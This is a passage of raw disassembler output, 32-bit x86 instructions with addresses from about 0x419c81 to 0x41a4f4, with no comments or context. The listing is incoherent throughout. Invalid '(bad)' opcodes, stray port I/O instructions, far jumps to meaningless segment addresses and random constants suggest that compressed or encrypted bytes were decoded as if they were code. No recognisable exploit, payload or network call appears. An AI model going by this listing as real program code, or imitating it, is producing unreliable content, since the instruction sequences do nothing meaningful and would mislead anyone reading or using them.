  419c81:	and    BYTE PTR [ecx+0x50],bl
  419c84:	gs mov eax,0x923b4d57
  419c8a:	dec    edx
  419c8b:	ins    BYTE PTR es:[edi],dx
  419c8c:	push   esp
  419c8d:	fsubr  QWORD PTR [ecx+0x46]
  419c90:	stc    
  419c91:	loope  0x419c87
  419c93:	jb     0x419c95
	...
  419ca5:	add    BYTE PTR [eax],al
  419ca7:	add    ah,bh
  419ca9:	in     eax,dx
  419caa:	imul   ebp,DWORD PTR [esi],0x73ec0f8c
  419cb0:	mov    edi,?
  419cb2:	jmp    0x419d24
  419cb4:	sar    bl,0xeb
  419cb7:	jo     0x419c78
  419cb9:	data16 out dx,al
  419cbb:	jno    0x419c6d
  419cbd:	jmp    0x419c8b
  419cbf:	pop    esi
  419cc0:	lahf   
  419cc1:	addr16 int3 
  419cc3:	arpl   WORD PTR [eax-0x608f18c7],si
  419cc9:	jmp    0x419c97
  419ccb:	pop    esi
  419ccc:	jg     0x419d0d
  419cce:	xlat   BYTE PTR ds:[ebx]
  419ccf:	jo     0x419d3a
  419cd1:	cmp    DWORD PTR [esp+ecx*2],ecx
  419cd4:	ins    DWORD PTR es:[edi],dx
  419cd5:	call   0xfff8:0x99634ff8
  419cdc:	ds push esi
  419cde:	(bad)  
  419cdf:	jae    0x419d3c
  419ce1:	dec    esp
  419ce2:	cli    
  419ce3:	bound  edi,QWORD PTR [eax]
  419ce5:	lods   eax,DWORD PTR ds:[esi]
  419ce6:	loopne 0x419d46
  419ce8:	pop    edi
  419ce9:	sbb    esp,0x62
  419cec:	sub    eax,0x3041d092
  419cf1:	mov    edx,?
  419cf3:	bound  edx,QWORD PTR [edx-0x21]
  419cf6:	clc    
  419cf7:	pop    ebx
  419cf8:	pop    edi
  419cf9:	cwde   
  419cfa:	clc    
  419cfb:	jae    0x419d32
  419cfd:	xchg   ebp,eax
  419cfe:	aad    0x70
  419d00:	mov    WORD PTR [edi-0xed29436],cs
  419d06:	out    0x45,eax
  419d08:	sbb    BYTE PTR [ebx+0x2e08],bh
	...
  419d1e:	add    BYTE PTR [eax],al
  419d20:	repnz mov ebx,0x27c9ffec
  419d26:	fldcw  WORD PTR [eax]
  419d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d29:	test   eax,eax
  419d2b:	data16 loop 0x419cf0
  419d2e:	fdiv   QWORD PTR [eax-0xc]
  419d31:	shr    ah,1
  419d33:	imul   eax,eax,0x1e
  419d36:	stc    
  419d37:	(bad)  
  419d38:	jmp    0x846f:0xe0e2cb94
  419d3f:	in     al,0xb9
  419d41:	js     0x419d22
  419d43:	mov    esi,0xd3bb56b0
  419d48:	cmp    edx,DWORD PTR [edx-0x62]
  419d4b:	in     eax,0xa1
  419d4d:	ja     0x419cd1
  419d4f:	out    dx,eax
  419d50:	mov    dl,0x6d
  419d52:	(bad)  
  419d53:	bnd jno 0x419dbe
  419d56:	ja     0x419d47
  419d58:	sbb    esp,DWORD PTR [edx+0x48ca2723]
  419d5e:	das    
  419d5f:	add    al,0x7d
  419d61:	imul   edx,DWORD PTR [ebx-0x21],0x7c
  419d65:	scas   al,BYTE PTR es:[edi]
  419d66:	dec    eax
  419d67:	out    0x72,al
  419d69:	xchg   esp,eax
  419d6a:	sub    esi,DWORD PTR [ecx]
  419d6c:	dec    eax
  419d6d:	scas   eax,DWORD PTR es:[edi]
  419d6e:	sub    eax,0x1b945bd0
  419d73:	shr    DWORD PTR [edx+0x68],1
  419d76:	dec    esp
  419d77:	shr    BYTE PTR [esi+0x61],0x18
  419d7b:	frstor [ecx+0x77]
  419d7e:	adc    DWORD PTR [ebx*2+0xd0254d],eax
	...
  419d95:	add    BYTE PTR [eax],al
  419d97:	add    BYTE PTR [eax+0x53],bl
  419d9a:	xor    DWORD PTR [edi-0x1ce4aea9],edi
  419da0:	cmp    al,0x61
  419da2:	or     al,0xf1
  419da4:	inc    edi
  419da5:	dec    eax
  419da6:	clc    
  419da7:	repz cs push eax
  419daa:	or     dl,ah
  419dac:	aaa    
  419dad:	pop    ecx
  419dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419daf:	cmp    bl,BYTE PTR [eax+ebp*4+0x12]
  419db3:	rol    ebx,0x9c
  419db6:	or     al,0xbe
  419db8:	mov    ecx,0xab271152
  419dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dbe:	lock ret 0x55a6
  419dc2:	repnz shl BYTE PTR [edx-0x5806f757],0xa4
  419dca:	cmp    bl,bh
  419dcc:	dec    ebp
  419dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dce:	dec    esi
  419dcf:	fst    QWORD PTR [esi+0x639c4a52]
  419dd5:	stos   DWORD PTR es:[edi],eax
  419dd6:	fistp  DWORD PTR es:[ebx-0x54]
  419dda:	push   esp
  419ddb:	xchg   esi,eax
  419ddc:	es push 0x39
  419ddf:	mov    ebx,0x7a67578f
  419de4:	es push edx
  419de6:	pop    esp
  419de7:	cdq    
  419de8:	(bad)  
  419de9:	cmp    BYTE PTR [esi-0x7c],al
  419dec:	sub    eax,DWORD PTR [ebp+0x67]
  419def:	pop    ebx
  419df0:	das    
  419df1:	push   0x6d
  419df3:	jmp    0x59affaa9
  419df8:	mov    BYTE PTR [edx+0x457a],ch
	...
  419e0e:	add    BYTE PTR [eax],al
  419e10:	add    ah,bl
  419e12:	pop    eax
  419e13:	sub    al,0xde
  419e15:	dec    esi
  419e16:	pop    ecx
  419e17:	sbb    ebx,edx
  419e19:	test   al,0x22
  419e1b:	jmp    0x3abad8ff
  419e20:	jmp    0xa84f188d
  419e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e26:	aaa    
  419e27:	jecxz  0x419dd6
  419e29:	popf   
  419e2a:	or     BYTE PTR [edi*4-0x5100858a],bl
  419e31:	outs   dx,BYTE PTR ds:[esi]
  419e32:	imul   eax,ebx,0xffffffbc
  419e35:	popf   
  419e36:	or     BYTE PTR [edi],al
  419e38:	mov    ebx,0xaec9646f
  419e3d:	ja     0x419eab
  419e3f:	sti    
  419e40:	mov    edx,0x9d237964
  419e45:	popf   
  419e46:	or     BYTE PTR [edi],cl
  419e48:	nop
  419e49:	inc    eax
  419e4a:	dec    ebx
  419e4b:	mov    ebx,0xb75a444a
  419e50:	mov    al,0x94
  419e52:	dec    esi
  419e53:	add    BYTE PTR [ecx],dl
  419e55:	(bad)  
  419e56:	adc    al,0x4e
  419e58:	pop    edx
  419e59:	call   0xc742e452
  419e5e:	inc    edx
  419e5f:	outs   dx,DWORD PTR ds:[esi]
  419e60:	and    dl,BYTE PTR [edi-0x460e9689]
  419e66:	ja     0x419e96
  419e68:	in     eax,dx
  419e69:	icebp  
  419e6a:	pusha  
  419e6b:	add    BYTE PTR [esi],al
  419e6d:	ror    BYTE PTR [edx+0x54],1
  419e70:	add    dl,dh
  419e72:	push   esi
  419e73:	inc    ebp
	...
  419e88:	jmp    0x1aa40251
  419e8d:	mov    dl,0x4e
  419e8f:	push   esp
  419e90:	add    eax,0xe22e37b7
  419e95:	ret    0x6357
  419e98:	mov    bh,0xb9
  419e9a:	fs je  0x419f03
  419e9d:	nop
  419e9e:	push   edi
  419e9f:	dec    edi
  419ea0:	mov    bl,0xbc
  419ea2:	pop    ebx
  419ea3:	inc    ecx
  419ea4:	mov    bh,0xcd
  419ea6:	push   eax
  419ea7:	push   edx
  419ea8:	pop    edx
  419ea9:	repnz arpl WORD PTR ds:0x2044bcb3,bp
  419eb0:	out    0xb4,al
  419eb2:	cmp    ebx,DWORD PTR [ebx+esi*4-0x44]
  419eb6:	inc    esp
  419eb7:	push   ebx
  419eb8:	and    dl,0x7a
  419ebb:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  419ebd:	jecxz  0x419eb3
  419ebf:	inc    ebp
  419ec0:	add    eax,0xdbba4314
  419ec6:	bound  esi,QWORD PTR [ebp+eiz*4-0x34]
  419eca:	pop    eax
  419ecb:	push   eax
  419ecc:	aad    0xcc
  419ece:	ins    DWORD PTR es:[edi],dx
  419ecf:	ins    BYTE PTR es:[edi],dx
  419ed0:	nop
  419ed1:	lods   eax,DWORD PTR ds:[esi]
  419ed2:	ins    BYTE PTR es:[edi],dx
  419ed3:	add    BYTE PTR [ebp-0xf],dh
  419ed6:	ja     0x419f4b
  419ed8:	mov    dl,0xf5
  419eda:	jbe    0x419f40
  419edc:	jne    0x419ea1
  419ede:	imul   esi,DWORD PTR [edx-0x74],0xca71dfb9
  419ee5:	int3   
  419ee6:	out    0x62,eax
  419ee8:	mov    eax,?
  419eea:	std    
  419eeb:	bound  eax,QWORD PTR [eax]
	...
  419efd:	add    BYTE PTR [eax],al
  419eff:	add    dh,bl
  419f01:	and    al,0xcd
  419f03:	call   esp
  419f05:	rcl    ebx,1
  419f07:	jae    0x419eee
  419f09:	int3   
  419f0a:	aam    0x43
  419f0c:	in     eax,0xfd
  419f0e:	fbld   TBYTE PTR [eax-0x40]
  419f11:	or     bh,bl
  419f13:	jbe    0x419ea1
  419f15:	sbb    ebp,edx
  419f17:	jno    0x419ed9
  419f19:	stc    
  419f1a:	out    dx,eax
  419f1b:	push   0xffffffae
  419f1d:	or     bl,bh
  419f1f:	(bad)  
  419f20:	mov    esi,0xa975fb10
  419f25:	pop    ebp
  419f26:	fnsave [esi-0x64]
  419f29:	adc    BYTE PTR [ecx],cl
  419f2b:	adc    BYTE PTR [ebx+ebp*8-0x538b61f8],cl
  419f32:	or     al,0x6a
  419f34:	imul   ebx,DWORD PTR [eax+edi*8+0x7e],0xb6297753
  419f3c:	aad    0xea
  419f3e:	test   al,0xf8
  419f40:	icebp  
  419f41:	(bad)  
  419f42:	fimul  WORD PTR [edx+0x45]
  419f45:	jmp    0x419f81
  419f47:	mov    eax,cs:0xa2373ad9
  419f4d:	mov    esi,0xe57c0031
  419f52:	inc    BYTE PTR [edi]
  419f54:	ja     0x419f3f
  419f56:	or     eax,DWORD PTR [ebx]
  419f58:	xchg   ecx,eax
  419f59:	repnz or eax,0xe97e8c01
  419f5f:	gs and dl,ah
  419f62:	jmp    0x419fd5
	...
  419f78:	sub    DWORD PTR [edi-0x38],edi
  419f7b:	data16 sub cl,BYTE PTR [ebp+edi*8-0x506bc7bb]
  419f83:	iret   
  419f84:	fsubr  QWORD PTR [ebx-0x25]
  419f87:	call   0xe201e72f
  419f8c:	fidiv  DWORD PTR [ecx-0x34]
  419f8f:	cmc    
  419f90:	jae    0x419fe3
  419f92:	fdivrp st(6),st
  419f94:	fist   WORD PTR [esp+ebx*4-0x2099110a]
  419f9b:	sar    DWORD PTR [edx-0x43fc4d9b],cl
  419fa1:	imul   edx,DWORD PTR [ecx-0x73bcb409],0x8460b0e0
  419fab:	and    edx,eax
  419fad:	imul   edx,DWORD PTR [ecx-0x77aa2ffd],0xffffffe5
  419fb4:	scas   al,BYTE PTR es:[edi]
  419fb5:	mov    di,ax
  419fb8:	lods   al,BYTE PTR ds:[esi]
  419fb9:	ins    DWORD PTR es:[edi],dx
  419fba:	fbld   TBYTE PTR [ecx]
  419fbc:	mov    al,0x5f
  419fbe:	sbb    dh,0x13
  419fc1:	pusha  
  419fc2:	push   edx
  419fc3:	out    0x7d,eax
  419fc5:	stos   BYTE PTR es:[edi],al
  419fc6:	inc    edx
  419fc7:	loope  0x41a03a
  419fc9:	jb     0x41a013
  419fcb:	jmp    0xe7943ccb
  419fd0:	jg     0x41a032
  419fd2:	pop    eax
  419fd3:	loop   0x41a045
  419fd5:	mov    ah,0x45
  419fd7:	jecxz  0x41a04f
  419fd9:	outs   dx,DWORD PTR ds:[esi]
  419fda:	cld    
  419fdb:	and    eax,0x0
	...
  419ff0:	mov    WORD PTR [esi+0x6832f9df],?
  419ff6:	adc    al,0xe7
  419ff8:	xchg   BYTE PTR [esi+0x7230d4df],dh
  419ffe:	adc    edi,ecx
  41a000:	pop    edx
  41a001:	data16 or al,0xd0
  41a004:	pop    esp
  41a005:	imul   ebx,DWORD PTR [ecx+eiz*8],0x39
  41a009:	inc    eax
  41a00a:	add    al,bh
  41a00c:	sub    esi,DWORD PTR [ebx+0x8]
  41a00f:	add    al,0xbc
  41a011:	dec    eax
  41a012:	jnp    0x41a029
  41a014:	mov    ah,0x41
  41a016:	push   esp
  41a017:	mov    edx,0xd0796572
  41a01c:	ins    BYTE PTR es:[edi],dx
  41a01d:	push   0x79
  41a01f:	jmp    0xd5bb095b
  41a024:	dec    ebp
  41a025:	aaa    
  41a026:	arpl   sp,cx
  41a028:	pop    DWORD PTR [ebx+0x79]
  41a02b:	les    ebx,FWORD PTR [ecx+0x4a]
  41a02e:	les    esi,FWORD PTR [bp+si-0x28]
  41a032:	inc    esp
  41a033:	enter  0x6558,0x7d
  41a037:	xchg   esi,eax
  41a038:	inc    ecx
  41a039:	je     0x41a043
  41a03b:	mov    ecx,0xa77c662c
  41a040:	inc    edx
  41a041:	imul   ebp,DWORD PTR [edx-0x7c],0x39
  41a045:	fcomp  DWORD PTR [eax-0x74]
  41a048:	and    DWORD PTR [ebx+0x5f],ebp
  41a04b:	(bad)  
  41a04c:	cs ins BYTE PTR es:[edi],dx
  41a04e:	pop    esp
  41a04f:	jo     0x41a070
  41a051:	jae    0x41a05b
  41a053:	lahf   
	...
  41a068:	pop    ds
  41a069:	push   0xa9e03d4e
  41a06e:	jo     0x41a0bc
  41a070:	in     al,dx
  41a071:	xlat   BYTE PTR ds:[ebx]
  41a072:	push   eax
  41a073:	daa    
  41a074:	in     eax,dx
  41a075:	arpl   WORD PTR [ebx+0x59],bp
  41a078:	out    dx,eax
  41a079:	jae    0x41a09c
  41a07b:	adc    dl,BYTE PTR [eax-0x1bb89abb]
  41a081:	pusha  
  41a082:	addr16 cmp esi,ebx
  41a085:	cmp    ecx,DWORD PTR [ecx+0x3e]
  41a088:	out    0x71,al
  41a08a:	imul   ecx,DWORD PTR [ecx+edx*8],0x62
  41a08e:	js     0x41a059
  41a090:	fsubr  DWORD PTR [eax+0x6e]
  41a093:	sbb    eax,0x47a36b5
  41a098:	mov    BYTE PTR [esi+0x5c],cl
  41a09b:	add    BYTE PTR [ebp-0x599a9350],al
  41a0a1:	fild   QWORD PTR [ebp+0x6e]
  41a0a4:	test   ah,bl
  41a0a6:	ins    DWORD PTR es:[edi],dx
  41a0a7:	outs   dx,DWORD PTR ds:[esi]
  41a0a8:	xchg   ebx,eax
  41a0a9:	mov    bl,0x77
  41a0ab:	(bad)  gs:[bx+di+0x72]
  41a0b0:	jne    0x41a07f
  41a0b2:	pop    eax
  41a0b3:	push   eax
  41a0b4:	test   esp,ebp
  41a0b6:	imul   esi,DWORD PTR [ebx+0x59],0x296162ba
  41a0bd:	mov    edx,0xdf956e63
  41a0c2:	ja     0x41a129
  41a0c4:	pop    ss
  41a0c5:	xchg   ebx,eax
  41a0c6:	dec    esi
  41a0c7:	push   esp
  41a0c8:	cmc    
  41a0c9:	mov    dl,0x6c
  41a0cb:	add    BYTE PTR gs:[eax],al
	...
  41a0de:	add    BYTE PTR [eax],al
  41a0e0:	fild   QWORD PTR es:[ebp+0x6e]
  41a0e4:	adc    al,0xdf
  41a0e6:	ins    DWORD PTR es:[edi],dx
  41a0e7:	outs   dx,DWORD PTR ds:[esi]
  41a0e8:	adc    esi,DWORD PTR [ebx-0x1fe99e88]
  41a0ee:	jnp    0x41a15f
  41a0f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0f1:	out    dx,eax
  41a0f2:	hlt    
  41a0f3:	inc    ebp
  41a0f4:	stc    
  41a0f5:	ret    0x6414
  41a0f8:	or     al,ah
  41a0fa:	js     0x41a165
  41a0fc:	xchg   ebx,eax
  41a0fd:	bnd js 0x41a169
  41a100:	bound  esi,QWORD PTR [esi-0x1dad8fec]
  41a106:	js     0x41a108
  41a108:	stos   DWORD PTR es:[edi],eax
  41a109:	mov    esp,0xed492044
  41a10e:	ja     0x41a184
  41a110:	cmp    al,0xb6
  41a112:	push   ebp
  41a113:	je     0x41a151
  41a115:	mov    bh,0x62
  41a117:	and    BYTE PTR [esi-0xf],al
  41a11a:	js     0x41a17d
  41a11c:	xchg   ecx,eax
  41a11d:	mov    bh,0x6b
  41a11f:	add    BYTE PTR [ebx-0x44],bh
  41a122:	inc    esp
  41a123:	and    BYTE PTR [ebp-0x73999c1e],ah
  41a129:	xchg   esp,eax
  41a12a:	call   0xcb2ee091
  41a12f:	push   ebx
  41a130:	cmp    al,0x7a
  41a132:	aam    0x62
  41a134:	xor    BYTE PTR [ecx-0x22df99f4],cl
  41a13a:	stc    
  41a13b:	addr16 sub ecx,ebx
  41a13e:	aam    0x2d
  41a140:	repnz mov edx,0xffd3
	...
  41a156:	add    BYTE PTR [eax],al
  41a158:	faddp  st(6),st
  41a15a:	jmp    0xd062:0xf6cd0373
  41a161:	clc    
  41a162:	retf   
  41a163:	push   eax
  41a164:	mov    ecx,0xd865d5fa
  41a169:	test   edx,0xd334bc53
  41a16f:	gs jecxz 0x41a179
  41a172:	fisub  DWORD PTR [edx-0x40]
  41a175:	clc    
  41a176:	clc    
  41a177:	dec    edi
  41a179:	or     al,0xfd
  41a17b:	pop    esi
  41a17c:	rcl    BYTE PTR [edi+esi*8],1
  41a17f:	call   edi
  41a181:	sub    eax,0xfdd54fdd
  41a186:	jmp    0xa271:0xdffa8c6c
  41a18d:	or     bh,dh
  41a18f:	dec    ebx
  41a190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a191:	pop    edx
  41a192:	std    
  41a193:	sub    eax,0xffe84084
  41a198:	push   ecx
  41a199:	push   eax
  41a19a:	in     al,0x72
  41a19c:	jg     0x41a143
  41a19e:	shr    DWORD PTR [ebx+0x69],cl
  41a1a1:	jmp    0x41a18d
  41a1a3:	jae    0x41a201
  41a1a5:	call   0x6dd3:0x856973d3
  41a1ac:	gs jmp 0x41a179
  41a1af:	pop    esi
  41a1b0:	pop    edi
  41a1b1:	lahf   
  41a1b2:	fnstenv [ebx+0x3b]
  41a1b5:	xchg   esp,eax
  41a1b6:	sbb    eax,0x1152a3e9
  41a1bb:	fild   WORD PTR [eax]
	...
  41a1cd:	add    BYTE PTR [eax],al
  41a1cf:	add    BYTE PTR [eax+0x61],al
  41a1d2:	add    al,0xf2
  41a1d4:	mov    bl,0x4f
  41a1d6:	cmp    edx,esp
  41a1d8:	push   edi
  41a1d9:	imul   esi,edx,0xfffffff7
  41a1dc:	jno    0x41a24e
  41a1de:	add    DWORD PTR [eax+edi*1],eax
  41a1e1:	inc    edi
  41a1e2:	add    ah,dh
  41a1e4:	daa    
  41a1e5:	outs   dx,DWORD PTR ds:[esi]
  41a1e6:	adc    bh,al
  41a1e8:	(bad)  
  41a1e9:	jo     0x41a1c3
  41a1eb:	fsubrp st(7),st
  41a1ed:	push   ecx
  41a1ee:	xlat   BYTE PTR ds:[ebx]
  41a1ef:	icebp  
  41a1f0:	call   0xe815665c
  41a1f5:	pop    edi
  41a1f6:	rol    BYTE PTR [ebx],cl
  41a1f8:	mov    ebp,0xd8f7c565
  41a1fd:	jae    0x41a1b0
  41a1ff:	call   0xe309e8bb
  41a204:	loopne 0x41a1ba
  41a206:	xchg   esp,eax
  41a207:	in     al,0xb4
  41a209:	mov    ah,0xa2
  41a20b:	fidiv  WORD PTR [esi-0x4d08639c]
  41a211:	data16 xchg bh,cl
  41a214:	fsubr  DWORD PTR [ebx+0x75]
  41a217:	leave  
  41a218:	mov    dl,0x64
  41a21a:	stos   DWORD PTR es:[edi],eax
  41a21b:	lds    edi,FWORD PTR [edi-0x572d20bc]
  41a221:	outs   dx,BYTE PTR ds:[esi]
  41a222:	jae    0x41a21a
  41a224:	mov    dl,0x62
  41a226:	mov    edi,cs
  41a228:	pop    ecx
  41a229:	imul   eax,DWORD PTR [edx-0x23],0xffffffa3
  41a22d:	inc    edi
  41a22e:	inc    eax
  41a22f:	fstp   DWORD PTR [ebx+0xdf4e51]
	...
  41a245:	add    BYTE PTR [eax],al
  41a247:	add    BYTE PTR [ebx+0x5f],ah
  41a24a:	pop    ebx
  41a24b:	fstp   TBYTE PTR [ecx+0x6d]
  41a24e:	sub    edx,ebp
  41a250:	push   0x66
  41a252:	sub    ebx,ebx
  41a254:	imul   edi,DWORD PTR [eax],0x8
  41a257:	inc    esp
  41a258:	fisub  WORD PTR [ecx+0x54]
  41a25b:	inc    ebx
  41a25c:	jmp    0xdd2b1bd3
  41a261:	ins    DWORD PTR es:[edi],dx
  41a262:	jl     0x41a268
  41a264:	nop
  41a265:	inc    ecx
  41a266:	jns    0x41a274
  41a268:	mov    esi,0xb7e94c4d
  41a26d:	outs   dx,BYTE PTR ds:[esi]
  41a26e:	or     BYTE PTR fs:[ecx-0x46e6f79d],ch
  41a275:	bound  edi,QWORD PTR [ecx+ebp*8-0x37]
  41a279:	addr16 fs add eax,0x17084673
  41a280:	jns    0x41a2c0
  41a282:	outs   dx,BYTE PTR ds:[esi]
  41a283:	jmp    0xcca7de08
  41a288:	(bad)
  41a28d:	xor    DWORD PTR [esi],0x676b53e9
  41a293:	iret   
  41a294:	jae    0x41a2cd
  41a296:	jo     0x41a281
  41a298:	adc    cl,BYTE PTR [ebx+0x28]
  41a29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a29c:	arpl   WORD PTR [eax+ecx*1-0x67],sp
  41a2a0:	cmp    eax,0x2c846241
  41a2a5:	dec    eax
  41a2a6:	adc    BYTE PTR es:[ecx+0x3b],0x8
  41a2ab:	mov    edi,0x0
	...
  41a2c0:	aaa    
  41a2c1:	aas    
  41a2c2:	fs jmp 0xa77e2bfc
  41a2c8:	push   ecx
  41a2c9:	cmp    DWORD PTR ds:0x4a7f5fba,0xffffffb8
  41a2d0:	rol    DWORD PTR [ebp-0x742be2dd],1
  41a2d6:	xor    BYTE PTR [edi+eiz*4],cl
  41a2d9:	xchg   BYTE PTR [esi],bh
  41a2db:	sub    edx,DWORD PTR [ebx-0x47e8c47d]
  41a2e1:	pop    edx
  41a2e2:	inc    edi
  41a2e3:	add    BYTE PTR [eax-0x58bbda76],dh
  41a2e9:	mov    DWORD PTR [ecx+0x0],esi
  41a2ec:	stos   DWORD PTR es:[edi],eax
  41a2ed:	icebp  
  41a2ee:	jp     0x41a351
  41a2f0:	jae    0x41a2de
  41a2f2:	inc    esp
  41a2f3:	cs xchg ecx,eax
  41a2f5:	mov    dh,0xf4
  41a2f7:	pop    ebx
  41a2f8:	jl     0x41a30c
  41a2fa:	pop    eax
  41a2fb:	outs   dx,DWORD PTR ds:[esi]
  41a2fc:	or     esp,0x7b
  41a2ff:	popa   
  41a300:	xchg   DWORD PTR [ebx-0x3585b1b0],edi
  41a306:	push   ebp
  41a307:	inc    esi
  41a308:	sub    eax,0xbb8a2df4
  41a30e:	push   ebp
  41a30f:	arpl   WORD PTR [esi+0x616e79f1],dx
  41a315:	xchg   edi,eax
  41a316:	push   edi
  41a317:	popa   
  41a318:	dec    ecx
  41a319:	retf   
  41a31a:	hlt    
  41a31b:	jmp    DWORD PTR [ebp-0x69]
  41a31e:	or     BYTE PTR [eax],al
  41a320:	jne    0x41a2b9
  41a322:	or     BYTE PTR [esi],bh
	...
  41a338:	jne    0x41a2bd
  41a33a:	and    eax,DWORD PTR [eax]
  41a33c:	pop    ecx
  41a33d:	out    0x43,eax
  41a33f:	push   eax
  41a340:	push   esi
  41a341:	loopne 0x41a387
  41a343:	popa   
  41a344:	push   es
  41a345:	les    edi,FWORD PTR [ebx+0x6f]
  41a348:	daa    
  41a349:	mov    ebx,0xe4590036
  41a34e:	inc    ecx
  41a34f:	push   esp
  41a350:	cmc    
  41a351:	fild   WORD PTR [ecx+eiz*2+0x6]
  41a355:	les    edi,FWORD PTR [ebx+0x6f]
  41a358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a359:	mov    ebx,0xdd90036
  41a35e:	inc    edx
  41a35f:	inc    ecx
  41a360:	cmc    
  41a361:	fild   WORD PTR [ecx+eiz*2-0x7a]
  41a365:	les    edi,FWORD PTR [ebx+0x6f]
  41a368:	addr16 mov ah,0x36
  41a36b:	add    BYTE PTR [ecx-0x73aba6f0],bl
  41a371:	lea    ebp,[edi-0x3e6e8aa2]
  41a377:	dec    edi
  41a378:	ins    DWORD PTR es:[edi],dx
  41a379:	mov    ?,ebp
  41a37b:	je     0x41a3e8
  41a37d:	(bad)
  41a381:	mov    ebp,0x5e354acc
  41a386:	(bad)  
  41a387:	ins    BYTE PTR es:[edi],dx
  41a388:	aas    
  41a389:	stos   BYTE PTR es:[edi],al
  41a38a:	jmp    0x286d:0xd38a5873
  41a391:	call   0x75d3:0xb16c70f9
  41a398:	sub    ebp,ebx
  41a39a:	scas   eax,DWORD PTR es:[edi]
  41a39b:	pop    esi
	...
  41a3b0:	and    eax,0x23510ca1
  41a3b5:	mov    ds:0xcded74f8,eax
  41a3ba:	out    0x5b,eax
  41a3bc:	shl    esp,1
  41a3be:	in     eax,dx
  41a3bf:	jno    0x41a3ac
  41a3c1:	out    dx,al
  41a3c2:	shl    DWORD PTR [ebp-0x8],1
  41a3c5:	pop    es
  41a3c6:	fisub  DWORD PTR [esi-0x6]
  41a3c9:	xlat   BYTE PTR ds:[ebx]
  41a3ca:	shl    DWORD PTR [edi+ebx*8-0x65],1
  41a3ce:	mov    al,0x66
  41a3d0:	loop   0x41a3aa
  41a3d2:	sub    BYTE PTR [ebx-0x13],cl
  41a3d5:	aam    0xdc
  41a3d7:	jmp    edi
  41a3d9:	xor    ah,dl
  41a3db:	pusha  
  41a3dc:	mov    esi,0xb26cfe2a
  41a3e1:	daa    
  41a3e2:	int    0x54
  41a3e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e5:	sbb    ebp,edx
  41a3e7:	ins    BYTE PTR es:[edi],dx
  41a3e8:	mov    ds:0xad4b292e,eax
  41a3ed:	and    al,0xdd
  41a3ef:	(bad)  
  41a3f0:	mov    esi,0x9b73e722
  41a3f5:	sbb    al,0xfb
  41a3f7:	bound  ebp,QWORD PTR [eax+0x30]
  41a3fa:	aam    0x60
  41a3fc:	jle    0x41a392
  41a3fe:	pop    esi
  41a3ff:	imul   DWORD PTR [eax+0x3a]
  41a402:	pop    ebx
  41a403:	enter  0x3b58,0x4d
  41a407:	loopne 0x41a481
  41a409:	dec    ecx
  41a40a:	push   edx
  41a40b:	and    al,0x57
  41a40d:	xor    ebx,DWORD PTR [eax-0x28]
  41a410:	(bad)  [esi+0x46]
  41a413:	loop   0x41a415
	...
  41a425:	add    BYTE PTR [eax],al
  41a427:	add    BYTE PTR [edi+0x49],bl
  41a42a:	inc    eax
  41a42b:	imul   BYTE PTR [esi]
  41a42d:	jo     0x41a440
  41a42f:	fnsave [esi]
  41a431:	push   ebx
  41a432:	adc    eax,esi
  41a434:	cmp    al,0x70
  41a436:	and    DWORD PTR [esi],esi
  41a438:	push   eax
  41a439:	gs add al,0xf0
  41a43c:	pop    ds
  41a43d:	cmp    esi,ebp
  41a43f:	loop   0x41a45d
  41a441:	xchg   esp,eax
  41a442:	and    esp,ebp
  41a444:	pop    ds
  41a445:	xor    ebp,DWORD PTR [ebx]
  41a447:	fstp   QWORD PTR ds:0xffe52394
  41a44d:	xor    ebp,DWORD PTR [ebx]
  41a44f:	(bad)  
  41a451:	push   esi
  41a452:	rcr    dh,0x7b
  41a455:	pusha  
  41a456:	rcr    ah,0xe7
  41a459:	ss into 
  41a45b:	jmp    0x41a416
  41a45d:	cmp    esi,DWORD PTR [ebp-0x21999c24]
  41a463:	loope  0x41a444
  41a465:	dec    ecx
  41a466:	shl    ch,0xee
  41a469:	jo     0x41a3fa
  41a46b:	fisubr DWORD PTR [ecx+eax*2+0x45bad6ff]
  41a472:	xchg   ebx,eax
  41a473:	loopne 0x41a41b
  41a475:	inc    ebp
  41a476:	mov    edi,0xdf35a1bc
  41a47b:	ror    edx,cl
  41a47d:	dec    eax
  41a47e:	xchg   DWORD PTR [ebx],eax
  41a480:	shl    BYTE PTR [esi+ebx*4-0x1a],0xa8
  41a485:	gs mov dh,dh
  41a488:	lahf   
  41a489:	aaa    
  41a48a:	or     BYTE PTR [eax+eax*1+0x0],al
	...
  41a49d:	add    BYTE PTR [eax],al
  41a49f:	add    BYTE PTR [ebp-0x707f99c7],ah
  41a4a5:	fs jp  0x41a4fe
  41a4a8:	in     eax,dx
  41a4a9:	inc    edx
  41a4aa:	addr16 dec esp
  41a4ac:	mov    BYTE PTR [eax+0x67],bl
  41a4af:	pop    ebp
  41a4b0:	out    dx,eax
  41a4b1:	pusha  
  41a4b2:	addr16 push ebp
  41a4b4:	rcl    al,0x67
  41a4b7:	dec    edx
  41a4b8:	icebp  
  41a4b9:	aas    
  41a4ba:	jnp    0x41a50b
  41a4bc:	fadd   QWORD PTR [ebx+0x26]
  41a4bf:	inc    eax
  41a4c0:	out    0x39,al
  41a4c2:	or     BYTE PTR ds:0x16693fd8,cl
  41a4c8:	jecxz  0x41a53b
  41a4ca:	pop    edi
  41a4cb:	or     eax,0xf656388
  41a4d0:	pushf  
  41a4d1:	inc    edi
  41a4d2:	addr16 sbb eax,ebx
  41a4d5:	ins    BYTE PTR es:[edi],dx
  41a4d6:	aas    
  41a4d7:	pop    ss
  41a4d8:	mov    cl,0x42
  41a4da:	imul   eax,DWORD PTR ds:0x675db7,0x64
  41a4e1:	ror    BYTE PTR [ebx-0x4],1
  41a4e4:	outs   dx,BYTE PTR ds:[esi]
  41a4e5:	aaa    
  41a4e6:	fs test al,0x5b
  41a4e9:	xor    al,0x7a
  41a4eb:	les    edi,FWORD PTR [eax+0x45]
  41a4ee:	or     BYTE PTR [ebp-0x409fcab6],bh
  41a4f4:	inc    esp
